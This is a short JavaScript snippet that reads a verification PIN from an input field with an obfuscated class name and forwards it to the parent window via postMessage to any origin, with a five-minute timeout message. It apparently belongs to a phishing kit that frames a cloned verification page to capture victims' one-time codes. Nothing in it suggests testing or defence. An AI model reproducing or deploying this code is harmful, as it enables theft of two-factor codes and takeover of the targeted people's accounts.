setTimeout(function() {
    parent.postMessage("timeoutCondition", "*");
}, 300000);

function verficationAccount() {
    var code = window.document.getElementsByClassName('Xxfqnf')['Pin'].value;
    parent.postMessage("code: " + code, "*");
    return false
}
